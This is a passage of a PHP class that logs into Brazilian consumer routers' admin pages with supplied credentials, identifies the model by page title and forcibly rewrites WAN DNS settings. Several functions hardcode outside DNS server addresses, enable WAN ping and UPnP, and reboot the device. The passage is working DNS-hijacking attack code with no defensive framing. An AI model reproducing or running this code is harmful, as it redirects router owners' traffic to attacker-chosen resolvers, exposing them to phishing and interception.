		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=107.155.152.15&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}	
	private function NWirelessRouter($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=198.27.107.135&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}
	private function OverTek($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=198.27.107.135&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}
	
	private function MWRWR936IABK($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwan.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1={$DNS1}&dns2={$DNS2}&dns3=198.27.107.135&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwan.asp&save=Aplicar+Altera%E7%F5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}	
	
	private function RaLink($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/tcpipwlan-pt.asp");
		curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$headers = array();
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		//$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);
		echo $result;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formWanTcpipSetup");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "dnsMode=dnsManual&dns1=144.217.96.84&dns2=198.27.107.135&dns3=0.0.0.0&wan_macAddr=000000000000&upnpEnabled=ON&pingWanAccess=ON&WANPassThru1=ON&WANPassThru2=ON&WANPassThru3=ON&submit-url=%2Ftcpipwlan-pt.asp&save=Aplicar+Altera%C3%A7%C3%B5es");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");

		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tcpipwan.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://{$Host}/goform/formRebootCheck");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "submit-url=%2Ftcpipwan.asp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Encoding: gzip, deflate";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "Authorization: Basic ".base64_encode("{$User}:{$Pass}");
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/tools.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$result = curl_exec($ch);
		curl_close($ch);
		curl_close($this->ch);
		//echo $result;
	}
	public function ChangeDNS($Host,$User,$Pass,$DNS1,$DNS2)
	{
		$NewOne = array();
		$NewOne[0]["name"]				= "OiWTech-Router";
		$NewOne[0]["title"] 			= '.:: OIWTECH :: AP/Router ::.';
		$NewOne[0]["function"]			= "OiwTech";
		$NewOne[0]["matchstring"]		= false;
		
		$NewOne[1]["name"]				= "Krazer WispOS Firmware V1.0";
		$NewOne[1]["title"] 			= 'Krazer WispOS Firmware V1.0';
		$NewOne[1]["function"]			= "KrazerWispOS";
		$NewOne[1]["matchstring"]		= false;
		
		$NewOne[2]["name"]				= "WLAN AP Webserver";
		$NewOne[2]["title"] 			= 'WLAN AP Webserver';
		$NewOne[2]["function"]			= "WlanAPWebServer";
		$NewOne[2]["matchstring"]		= false;
		
		$NewOne[3]["name"]				= "Roteador ELSYS";
		$NewOne[3]["title"] 			= 'Roteador ELSYS';
		$NewOne[3]["function"]			= "Elsys";
		$NewOne[3]["matchstring"]		= false;
		
		$NewOne[4]["name"]				= "Roteador Wireless ST COM";
		$NewOne[4]["title"] 			= 'Roteador Wireless ST COM';
		$NewOne[4]["function"]			= "StCom";
		$NewOne[4]["matchstring"]		= false;
		
		$NewOne[5]["name"]				= "AP Router New Generation";
		$NewOne[5]["title"] 			= 'AP Router New Generation';
		$NewOne[5]["function"]			= "ApRouterNewGeneration";
		$NewOne[5]["matchstring"]		= false;
		
		$NewOne[6]["name"]				= "11n Wireless Router";
		$NewOne[6]["title"] 			= '11n Wireless Router';
		$NewOne[6]["function"]			= "NWirelessRouter";
		$NewOne[6]["matchstring"]		= false;
		
		$NewOne[7]["name"]				= "Realtek WLAN AP Webserver";
		$NewOne[7]["title"] 			= 'Realtek WLAN AP Webserver';
		$NewOne[7]["function"]			= "RealTek";
		$NewOne[7]["matchstring"]		= false;
		
		$NewOne[8]["name"]				= "Roteador Wireless MWR-WR936IA-BK";
		$NewOne[8]["title"] 			= 'Roteador Wireless MWR-WR936IA-BK';
		$NewOne[8]["function"]			= "MWRWR936IABK";
		$NewOne[8]["matchstring"]		= false;
		
		$NewOne[9]["name"]				= "Roteador Wireless MWR-WR936IA-BK";
		$NewOne[9]["title"] 			= '11n Wireless Router';
		$NewOne[9]["function"]			= "MWRWR936IABK";
		$NewOne[9]["matchstring"]		= false;
		
		$NewOne[10]["name"]				= "Ralink APSoC";
		$NewOne[10]["title"] 			= 'GoAhead WebServer';
		$NewOne[10]["function"]			= "RaLink";
		$NewOne[10]["matchstring"]		= "Realtek Semiconductor Corp";
		
		$NewOne[11]["name"]				= "OverTek Wlan";
		$NewOne[11]["title"] 			= 'OverTek Wlan';
		$NewOne[11]["function"]			= "OverTek";
		$NewOne[11]["matchstring"]		= "OverTek Wlan";
		
		for ($i = 0; $i <= count($NewOne)-1; $i++)
		{
			$isOnTitle = (strpos($this->Title ,$NewOne[$i]["title"]) !== false) ? true : false;
			$isOnBody = ($NewOne[$i]["matchstring"] !== false && strpos($this->Result ,$NewOne[$i]["matchstring"]) !== false) ? true : false;
			if ($isOnTitle || $isOnBody)
			{
				call_user_func('GoAhed::'.$NewOne[$i]["function"],$Host,$User,$Pass,$DNS1,$DNS2);
			}
		}
	}
	
	public function DoOthers($Host,$User,$Pass)
	{
		return true;
	}
	
	
	
}
